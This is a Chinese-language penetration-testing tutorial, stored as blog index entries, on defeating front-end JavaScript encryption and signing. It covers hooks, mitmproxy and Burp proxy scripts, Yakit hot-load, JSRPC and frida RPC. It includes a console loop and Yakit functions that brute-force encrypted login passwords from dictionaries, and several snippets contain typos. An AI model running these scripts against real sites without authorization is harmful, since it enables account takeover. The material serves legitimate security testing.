[{"categories":["Pentest"],"content":"本文主要介绍常见的应对前端JS加解密的方法 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:0:0","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"零、简述 常见需要前端JS调试完成加解密对抗的情况有： 参数值加密：如登录过程中对用户名、密码进行了加密； 键值加密：对参数的键值都进行了加密； 数据包全加密：对数据包请求体进行了全加密； 数据包签名：对数据包内容进行了某种签名算法以防篡改； 组合利用 常见加解密方法有： 对称加密：AES、SM4(国密)、 DES、3DES、SM1、SM7、RC5、RC6、RC4、ZUC、SSF446等 特点：加解密使用同一个密钥，可逆 非对称加密：RSA, SM2. SM9, Rabin, DH, DSA, ECC 特点：密钥是成对的，分为公钥和私钥； 散列算法：MD5、 SM3、 MAC, HMAC, SHA-1, SHA-2 (SHA-224. SHA-256, SHA-512/224. SHA-512/256) 等 特点：无密钥，不可逆，固定长度 问题解决思路： 分析加密算法，确认加密方式，还原加解密流程 分析密钥来源： 若为客户端生成密钥：密钥固定（硬编码密钥）/密钥随机（分析密钥生成算法） 若为服务器返回密钥：则重新建立连接并进行抓包，获取密钥，再加解密 若无法还原加解密流程：通常是存在魔改算法或混淆场景，通过定位明文将其转发，篡改明文后再转发回去走加密流程 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:1:0","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"一、常见加解密定位 常见的渗透测试场景包括web/小程序/公众号/app，在不同场景下的分析方法有所区别。 本文主要以Web端为例，其他场景不过多讨论。 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:2:0","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"web端 定位加密算法： 1、全局搜索关键字 参数名、“参数名=、参数名=、参数名： URI、API接口、加密算法关键词 encrypt, decrypt, JSON.stringify, JSON.parse, secret，secretkey，publickey, privatekey，padding， key, aes, sm4, rsa, sm2，des, iv, pkcs 搜索的关键词越短，出来的误报也就越多，所以要选好关键词 2、断点调试 找到一些关键词或关键动作打上断点，比如疑似加解密函数部分，鼠标点击特定按钮事件，网络请求等。 调用堆栈：可在浏览器点击对应请求后，右侧面板查看请求调用堆栈，然后打断点跟踪定位 XHR断点：在source资源面板右下角，可以添加URL关键字，在发起网络请求时触发 事件监听断点：可以在发生相关事件时触发断点，如登陆时触发click点击事件 DOM断点：可以在子元素改变时、属性改变时和元素被移除时触发断点，如滑块验证码 3、hook 在找不到关键字时，如混淆场景下，可以通过hook某些通用方法寻找突破口，如 JSON.stringify、JSON.parse 还可以hook如 cookie、header、URL、eval、Function、绕debugger等 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:2:1","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"APP端 定位加密算法： 1、静态分析 需要先对APP进行逆向，通过脱壳反编译得到源码； 然后也是jadx全局搜索关键字，类似Web思路，搜索如sign，加引号的“sign”等。 2、hook 也可以通过frida来hook一些java层的常见类/方法。 JAVA 层常见方法hook： HashMap的put方法； Log日志； JSONObject的 Jput、JgetString方法； 其他，如： ArrayList的add、addAll、set方法等； TextUtils的isEmpty方法； Collections的sort 方法； Toast的show方法； String的getBytes、 isEmpty方法、StringBuilder, StringBuffer； 常见加密库相关的hook（自吐算法）等 3、动态调试： log插桩、JEB、IDA、unidbg 4、H5调试 Android： 安卓手机开启adb调试， 电脑端 Edge浏览器访问edge://inspect，Chrome浏览器访问chrome://inspect 手机访问h5页面，在浏览器点击inspect打开 devtools即可调试 IOS： mac safari设置中开启网页开发者功能 iphone下safari设置中开启JavaScript、网页检查器 在手机Safari 浏览器打开需要调试的网站，然后在电脑上的Safari浏览器点击『开发』-\u003e『选择你的手机』-\u003e『选择需要调试的网址』即可打开手机网页的控制台 工具： iOS WebKit Debug Proxy ，支持Mac、Windows、Linux 调试 IOS ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:2:2","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"小程序 开启小程序调试： WeChatOpenDevTool，微信小程序强制开启开发者工具，也适用于开启微信内置浏览器F12控制台 然后可以像Web一样进行调试 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:2:3","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"公众号 微信内置浏览器调试 手机用usb连接至电脑 手机微信内点击http://debugxweb.qq.com/?inspector=true（只要跳转过微信首页就是开启了调试） 微信内打开所需调试网址, 例如weixin.qq.com chrome浏览器打开chrome://inspect/#devices会看到我们打开的网页weixin.qq.com Edge浏览器 edge://inspect 在点击chrome里的inspect 直接调试(可以直接用鼠标进行操作) 其他H5调试方法： npm install -g spy-debugger spy-debugger，微信调试，各种WebView样式调试、手机浏览器的页面真机调试。便捷的远程调试手机页面、抓包工具，支持：HTTP/HTTPS，无需USB连接设备。 上面提到的 WeChatOpenDevTool 也可用。 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:2:4","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"二、自动加解密思路 定位到关键加解密函数后，可以了解到程序的加解密流程和算法。一些常见的加解密算法可以通过 cyberchef 进行验证。 在测试过程中，我们肯定无法接受每次进行手动加解密，因此我们需要一些方法完成自动化加解密，常见方法有： 浏览器控制台编写JS代码 代理服务中转 JSRPC调试 CDP调试 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:3:0","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"三、控制台模拟操作 平时测试的时候，可能会遇到一些接口（如登陆接口）中的某些数据是加密的。 通常逻辑是通过对JS代码进行逆向分析后，了解到前端加密算法和关键函数，拿到密钥，然后编写相应脚本模拟加密过程构造想要的数据。 对于一些简单的场景也可以通过JS模拟前端的操作，可以免去对加解密的调试。 整理流程如下： 定位输入框和按钮 设置数据 点击按钮 分析前端代码，找到我们要的登录框输入点 然后定位到数据，有jquery的话会方便很多，没有就使用原生的js也不影响 document.getElementsByName(\"username\")[0] document.getElementsByName(\"password\")[0] document.getElementsByClassName(\"btn btn-primary btn-block\")[0] 如果不好找，可以直接编辑html，手动添加id属性，然后通过id进行定位 \u003cinput id=\"testusername\" data-v-ad2189ae=\"\" type=\"text\" name=\"username\" placeholder=\"请输入手机/邮箱\"\u003e document.getElementById(\"testusername\") 定位后该插入数据的就插入数据，该点击的就点击，具体看下面的实现代码 // 设置用户名、密码字典列表 var usernames = new Array('13299999999','13333333333','18888888888','13000000000'); var passwords = new Array('qwe123','root',...,'FALSE'); // 遍历字典列表，插入相应数据，模拟点击操作 for (i in usernames) { document.getElementById(\"testusername\").value=usernames[i] for (j in passwords) { document.getElementById(\"testpassword\").value=passwords[j] document.getElementsByClassName(\"btn btn-primary btn-block\")[0].click() } } 效果： ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:4:0","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"四、代理服务中转 通过对JS代码进行逆向分析后，了解到前端加密算法和关键函数，拿到密钥后，然后编写相应脚本模拟加密过程构造想要的数据。 编写通过工具或Python脚本等进行代理中转，通过脚本对数据包进行加解密处理。 介绍一些相关工具 mitmproxy Burp插件autoDecoder Yakkit 热加载 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:5:0","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"MITMProxy mitmproxy 是一款免费的开源交互式 HTTPS 代理工具。 Github项目地址 官方文档 详细版文档，写脚本时推荐参考 这里使用Burp+mitmproxy进行配合，可以配置上下游代理进行加解密 配置下游代理： 则是接收客户端加密请求进行解密，将解密后数据包发给burp。 当接收burp到明文后进行加密，将加密后数据包发给客户端。 配置上游代理： 则是接收burp明文请求后进行加密，将加密后数据包发给服务端。 当接收服务端加密响应，解密，发给burp。 1、下游代理：请求解密，响应加密（如decrypt.py） mitmdump --mode upstream:http://127.0.0.1:8080 -s decrypt.py --listen-port 9999 --ssl-insecure from mitmproxy import http, ctx import re from aesCipher import * class decryptData: # 解密请求包，发给burp def request(self, flow: http.HTTPFlow) -\u003e None: info = ctx.log.info if \"www.test.com\" in flow.request.headers[\"Host\"]: try: param = flow.request.get_text pattern = r\"encryptedData=(.*)\" match = re.search(pattern, param) if match: plainText = decrypt_aes_cbc(match.group(1),key,iv) request_body = \"encryptedData=\" + plainText flow.request.set_text(request_body) except Exception as e: info(e) # 加密响应包，发给客户端 def response(self, flow: http.HTTPFlow) -\u003e None: pass addons = [ decryptData() ] 2、上游代理：请求加密，响应加密（如encrypt.py） mitmdump -s encrypt.py --listen-port 8990 --ssl-insecure from mitmproxy import http, ctx import re from aesCipher import * class encryptData: # 加密请求包，发给服务器 def request(self, flow: http.HTTPFlow) -\u003e None: info = ctx.log.info if \"www.test.com\" in flow.request.headers[\"Host\"]: try: param = flow.request.get_text pattern = r\"encryptedData=(.*)\" match = re.search(pattern, param) if match: cipherText = encrypt_aes_cbc(match.group(1),key,iv) request_body = \"encryptedData=\" + cipherText flow.request.set_text(request_body) except Exception as e: info(e) # 解密响应包，发给burp def response(self, flow: http.HTTPFlow) -\u003e None: pass addons = [ encryptData() ] ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:5:1","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"autoDecoder 项目地址：https://github.com/f0ng/autoDecoder 加解密方式 自带算法进行加解密：直接通过插件自带的算法去加解密数据包(较为简单，仅支持部分AES、DES、DESede加密) 自定义接口进行加解密：通过python的flask框架去编写加解密数据包的api ，可自定义加解密的内容，默认传入的参数是整个请求体（request body）与整个响应体（response body），支持复杂的加解密算法，当然，这些都需要自行去写代码解密了 python代码模板 # -*- coding:utf-8 -*- # author:f0ngf0ng from flask import Flask,Response,request from pyDes import * import base64 def des_encrypt(s): \"\"\" DES 加密 :param s: 原始字符串 :return: 加密后字符串，16进制 \"\"\" secret_key = \"f0ngtest\" iv = \"f0ngf0ng\" k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5) en = k.encrypt(s, padmode=PAD_PKCS5) return base64.encodebytes(en).decode() def des_decrypt(s): \"\"\" DES 解密 :param s: 加密后的字符串，16进制 :return: 解密后的字符串 \"\"\" secret_key = \"f0ngtest\" iv = \"f0ngf0ng\" k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5) de = k.decrypt(base64.decodebytes(bytes(s,encoding=\"utf-8\")), padmode=PAD_PKCS5) return de.decode() app = Flask(__name__) @app.route('/encode',methods=[\"POST\"]) def encrypt(): param = request.form.get('data') # 获取 post 参数 encry_param = des_encrypt(param.strip(\"\\n\")) print(param) print(encry_param) return encry_param @app.route('/decode',methods=[\"POST\"]) def decrypt(): param = request.form.get('data') # 获取 post 参数 decrypt_param = des_decrypt(param.strip(\"\\n\")) print(param) print(decrypt_param) return decrypt_param if __name__ == '__main__': app.debug = True # 设置调试模式，生产模式的时候要关掉debug app.run(host=\"0.0.0.0\",port=\"8888\") ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:5:2","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"Yakkit 热加载 Yakit 是一个基于yak语言编写的工具，功能类似Burpsuite，主要功能有拦截http(s)数据包，漏洞检测，网站地图，自动/手动测试web应用，编码解码，请求与响应差异数据化等功能。 热加载 在聊热加载之前，我们首先需要对其进行了解：什么是热加载？ 广义上来说，热加载是一种允许在不停止或重启应用程序的情况下，动态加载或更新特定组件或模块的功能。这种技术常用于开发过程中，提高开发效率和用户体验。 在Yakit 中，热加载是一种高级技术，让 Yak 成为 Web Fuzzer 和用户自定义代码中的桥梁，它允许我们编写一段 Yak 函数，在 Web Fuzzer 过程中使用，从而实现自定义 fuzztag 或更多功能。 在MITM界面点击下方 “热加载”标签页，在恰当的 Hook 点编写我们希望操作流量做的事儿，然后加载进引擎中，等待流量执行。 通过一个简单的图例展示热加载代码在流量劫持中的过程： 以下给出示例，具体代码需要根据具体场景编写。 自动放行流量：热加载hijackSaveHTTPFlow方法， 手动劫持流量：hijackHTTPRequest+beforeRequest处理请求，hijackHTTPResponse+afterRequest处理响应 1、自动放行流量 热加载hijackSaveHTTPFlow方法，可以对自动放行的请求和响应进行解密，并且不影响原请求响应 hijackSaveHTTPFlow = func(flow /* *yakit.HTTPFlow */, modify /* func(modified *yakit.HTTPFlow) */, drop/* func0 */ { key = \"1234567890123456\" iv = \"1234567890123456\" // 解密请求 request, _ = codec.StrconvUnquote(flow.Request) reqBody = string(poc.GetHTTPPacketBody(request)) regexp = `encryptedData= (*)` cipherUrl = re.FindSubmatch(reqBody, regexp/*string*/)[1] cipherB64 = codec.DecodeUrl(cipherUrl) ~ cipherBytes = codec.DecodeBase64(cipherB64) ~ plainText = string(codec.AE§CBCDecrypt(key /*type: []byte*/, cipherBytes, iv /*type: []byte*/)~) flow. Request = str.ReplaceAll (request,cipherUrl, plainText) // // 解密响应 // response, _ = codec.StrconvUnquote(flow. Response) //...... // flow.Response = str.ReplaceAll(response,ciphel, plain Text) modify(flow) } 2、手动劫持流量 2.1、热加载hijackHTTPRequest 方法，可以对手动劫持的请求进行解密，但发给服务器之前，需要配合beforeRequest 方法再进行加密 处理响应: hijackHTTPResponse+afterRequest hijackHTTPRequest = func(isHttps, url, req, forward /*func(modifiedRequest []byte)*/, drop /*func() */) { key = \"1234567890123456\" iv = \"1234567890123456\" reqBody = string(poc.GetHTTPPacketBody(req)) regexp = `encryptedData=(.*)` cipherUrl = re.FindSubmatch(reqBody, regexp/*string*/)[1] cipherB64 = codec. DecodeUr(cipherUrl)~ cipherBytes = codec.DecodeBase64(cipherB64)~ plainText = string(codec.AESCBCDecrypt(key /*type:[]byte*/, cipherBytes, iv /*type:[]byte*/)~) modified = req.ReplaceAll(cipherUrl, plainText) forward(poc.FixHTTPRequest(modified)) } 2.2、beforeRequest方法，发给服务器之前，还原加密流程进行加密 beforeRequest = func(ishttps, oreq/*原始请求*/，req/*hijack修改后的请求*/){ key = \"1234567890123456\" iv = \"1234567890123456\" reqBody = string(poc.GetHTTPPacketBody(req)) regexp = `encryptedData=(.*)` plainText = re.FindSubmatch(reqBody, regexp/*string*/)[1] cipherBytes = codec.AESCBCEndypt(key /*type: []byte*/, plainText, iv /*type: [byte*/)~ cipherB64 = codec.EncodeBase64(cipherBytes) cipherUrl = codec.EscapeUrl(cipherB64) req = req.ReplaceAll(plainText, cipherUrl) return [byte(req) } WebFuzzer模块，也可以使用热加载来进行批量枚举爆破 编写热加载的函数，如rsa函数进行RSA加密 rsa = func(param) { pemBytes = []byte(`-----BEGIN PUBLIC KEY ----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYIIDYCkzujvi NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btiM DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3cb ocDbsNeCwNpRxwjldQIDAQAB -----END PUBLIC KEY -----`) cipherB64 = codec.EncodeBase64(codec.RSAEncryptWithPKCS1v15(pemBytes /*type: []byte*/, param) ~) cipherUrl = codec.EscapeUrl(cipherB64) return cipherUrl } 在请求包中标记需要执行RSA加密的部分，调用热加载函数rsa // 对整体数据包进行rsa加密 {{yak(rsa|{\"username\": \"admin\", \"password\":\"123456\"})}} // 对password字段进行枚举，再对整体数据包进行rsa加密 {{yak(rsa|{\"username\": \"admin\", \"password\":\"{{payload(pass top25)}}\"})}} 官方案例：热加载场景案例：爆破aes cbc加密 可以通过官方案例更深入了解 Yakit 的热加载功能及用法 官方中的AES加密函数 handle handle = func(p) { key = codec.DecodeHex(\"31323334313233343132333431323334\")~ iv = codec.DecodeHex(\"03395d68979ed8632646813f4c0bbdb3\")~ usernameDict = [\"admin\"] // passwordDict = x\"{{x(pass_top25)}}\" // 我们可以使用x前缀字符串来通过fuzztag语法获取pass_top25字典中的值 passwordDict = [\"admin\", \"123456\", \"admin123\", \"88888888\", \"666666\"] // 也可以直接使用手写的list resultList = [] for username in usernameDict { for password in passwordDict { m = {\"username\": username, \"password\": password} jsonInput = json.dumps(m) result = codec.AESCBCEncryptWithPKCS7Padding(key, jsonInput, iv)~ base64Result = codec.EncodeBase64(result) resultList.Append(base64Resu","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:5:3","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"五、JSRPC JSRPC简单来说就是远程调用JavaScript函数的方法。 RPC（Remote Procedure Call，远程过程调用）是一种通过网络让程序调用另一台计算机上的服务或程序的技术。它允许程序在不同的地址空间（通常是不同的计算机）之间调用函数或方法，并且可以基于多种协议实现。 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:6:0","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"JSRPC原理 JSRPC的原理是在客户端（即浏览器）注入 JSRPC环境，使客户端与JSRPC服务器建立WebSocket连接，保持通信。然后在客户端注册需要用到的加解密函数的demo，这样当JSRPC服务器发送信息给客户端时，客户端接收到并执行相应的方法，然后将结果发送回服务器。服务器接收到结果并将其显示出来。 JSRPC 一般都是基于 WebSocket 或者 WebSocket Secure协议实现，这里简单介绍一下这俩协议： WebSocket 是基于 TCP 的应用层协议，采用双向通信模式，就像一根两端开口的管道。当客户端和服务器建立连接后，双方都能随时向对方发送数据，其协议请求 url 以 ws:// 开头。这种特性使得 WebSocket 适用于需要实时交互的场景，如在线聊天、实时数据展示等。 WebSocket Secure（WSS）是 WebSocket 的加密版本，也是采用双向通信模式，请求协议以 wss:// 开头。为了维持稳定的长连接，WSS 通常需要每隔一段时间发送心跳包，比如简单的 ping 消息。正因如此，WSS 常用于对数据安全性要求较高的场景，像社交聊天室、股票实时报价、直播间信息流等。 WebSocket 与 WSS 的关系 和 http 与 https 的关系类似。 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:6:1","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"整体流程 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:6:2","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"使用方法 JsRPC项目 JsRPC-hliang 是用 go 语言写的，是专门为 JS 逆向做的项目。 Github项目地址：https://github.com/jxhczhl/jsrpc 从Github下载 jsrpc服务端 环境，搭建RPC服务端 1、启动服务端 启动一个JSRPC服务，然后监听12080端口， $ ./jsRpc __ _______..______ .______ ______ | | / || _ \\ | _ \\ / | | | | (----`| |_) | | |_) | | ,----' .--. | | \\ \\ | / | ___/ | | | `--' | .----) | | |\\ \\----.| | | `----. \\______/ |_______/ | _| `._____|| _| \\______| INFO[2025-04-29 18:08:08] 当前监听地址：0.0.0.0:12080 ssl启用状态：false 2、注入环境 网页开启F12控制台，在客户端控制台注入JSRPC环境。 打开 /resouces/JsEnv_De.js 复制文件中的全部代码，粘贴到浏览器控制台并执行(注意：可以在浏览器开启的时候就先注入环境，不要在调试断点时候注入) 3、建立通信 然后在控制台建立链接JSRPC服务器的通信 // 注入环境后连接通信 var demo = new Hlclient(\"ws://127.0.0.1:12080/ws?group=zzz\"); // 可选 //var demo = new Hlclient(\"ws://127.0.0.1:12080/ws?group=zzz\u0026clientId=hliang/\"+new Date().getTime()) 上述语句执行成功后，服务端会有如下提示： INFO[2025-04-29 18:08:08] 当前监听地址：0.0.0.0:12080 ssl启用状态：false INFO[2025-04-29 18:11:25] [新上线group:zzz,clientId:-\u003ee87f9ab1-59a2-4526-971b-5e373a4af448] 4、定位关键函数 找到加解密、签名、校验等逻辑所在的关键函数，打断点，为关键函数注册可以远程调用的方法。 示例： 在浏览器控制台中进行注册 // 注册一个方法 第一个参数hello为方法名， // 第二个参数为函数，resolve里面的值是想要的值(发送到服务器的) demo.regAction(\"hello\", function (resolve) { //这样每次调用就会返回“好困啊+随机整数” var Js_sjz = \"好困啊\"+parseInt(Math.random()*1000); resolve(Js_sjz); }) 访问接口，获得js端的返回值: http://127.0.0.1:12080/go?group=zzz\u0026action=hello 最常用的是带参数取值，可以这么用 //假设有一个函数 需要传递两个参数 function hlg(User,Status){ return User+\"说：\"+Status; } demo.regAction(\"hello3\", function (resolve,param) { //这里还是param参数 param里面的key 是先这里写，但到时候传接口就必须对应的上 res=hlg(param[\"user\"],param[\"status\"]) resolve(res); }) python脚本中调用 url = \"http://127.0.0.1:12080/go\" data = { \"group\": \"zzz\", \"action\": \"hello3\", \"param\": json.dumps({\"user\":\"黑脸怪\",\"status\":\"好困啊\"}) } print(data[\"param\"]) #dumps后就是长这样的字符串{\"user\": \"\\u9ed1\\u8138\\u602a\", \"status\": \"\\u597d\\u56f0\\u554a\"} res=requests.post(url, data=data) #这里换get也是可以的 print(res.text) 后续就是需要注册需要调用哪个函数的方法，JSRPC作者也是提供了demo，过一遍就行。 5、测试调用 访问对应链接，测试是否正常进行加解密 这里我们只需要注册相应调用函数的方法就可以了 import requests import json js_code = \"\"\" (function(){ console.log(\"test\") return \"执行成功\" })() \"\"\" url = \"http://localhost:12080/execjs\" data = { \"group\": \"zzz\", \"code\": js_code } res = requests.post(url, data=data) print(res.text) url = \"http://127.0.0.1:12080/go\" data = { \"group\": \"zzz\", \"action\": \"hello3\", \"param\": json.dumps({\"user\":\"黑脸怪\",\"status\":\"好困啊\"}) } print(data[\"param\"]) #dumps后就是长这样的字符串{\"user\": \"\\u9ed1\\u8138\\u602a\", \"status\": \"\\u597d\\u56f0\\u554a\"} res=requests.post(url, data=data) #这里换get也是可以的 print(res.text) 项目上使用 通过调试，找到加解密位置，将加解密函数进行注册，通过go?group={}\u0026action={}\u0026param={}接口调用注册的函数实现加解密。 逻辑调试通顺后，可以使用 mitmproxy 进行代理 https://github.com/mitmproxy/mitmproxy https://github.com/mochazi/mitmproxy-doc-cn Burp配置上游代理，设置代理条件即可进行自动化调用jsRpc进行加解密 若不使用jsrpc，传统方法是先找到前端所有涉及加解密部分JS代码并替换为空，把这部分代码补充环境到可以本地运行后，再通过mitmproxy或burp插件做到拦截请求时明文，发送请求后加密，相对的响应部分同理 而jsrpc的出现，可以让我们跳过扣代码补环境这一步，直接在发送请求时调用前端原本的加密函数进行加密处理 案例： JsRpc联动burp实现自动加解密（详细版）：用案例讲解JsRpc，配合Burp Sekiro框架 Sekiro 是由邓维佳大佬，俗称渣总，其功能更加强大，写的一个基于长链接和代码注入的 Android Private API 暴露框架，可以用在 APP 逆向、APP 数据抓取、Android 群控等场景，同时 Sekiro 也是目前公开方案唯一稳定的 JSRPC 框架。 项目地址：https://github.com/yint-tech/sekiro-open 官方文档：https://sekiro.iinti.cn/sekiro-doc/ frida-rpc 1、打开app，手机启用frida 2、电脑通过frida调用内存中的签名函数，并开启本地接口传递参数值 相关脚本 from fastapi import FastAPI, HTTPException from pydantic import BaseModel import uvicorn import frida # hook关键函数，生成签名值 jsCode = \"\"\" function getsign(data){ let result = \"\"; Java.perform(function () { let XX = Java.use(\"java.XX.XX\").$new(); result = Java.use(\"com.xx.SignUtils\").c(XX, XX) }) return result; } rpc.exports = (rpcfunc: getsign); \"\"\" process = frida.get_usb._device().attach（XX）#包名注入 script = process.create_script(jsCode) script.load() def get_ts(): # 其他戳参数生成 ts = XXX return ts app = FastAPI() # 创建 FastAPI 应用 class ParamsRequest(BaseModel):# 定义请求模型 params: str class SignResponse(BaseModel): # 定义响应模型 sign: str Ts: str @app.post（\"/sign\"， response_model=SignResponse） # 定义 sign接口 async def sign(request: ParamsRequest): try: Ts = get_ts() sign = script.exports_sync.rpcfunc(request.params+Ts) return {\"si","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:6:3","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"六、CDP CDP协议（Chrome DevTools Protocol）是Chrome 原生支持的调试协议，通过 WebSocket 连接控制浏览器实例。 ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:7:0","tags":["Pentest","crypto"],"title":"前端JS加解密对抗方法简述","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"CDP协议原理 支持动态监控 JS 执行、修改 DOM、调用函数等，适用于加解密逻辑的实时调试。 通过 Chrome 浏览器的原生调试接口（CDP），可在断点处直接执行 JS 表达式，获取作用域内的变量或调用函数，深度利用浏览器调试功能。 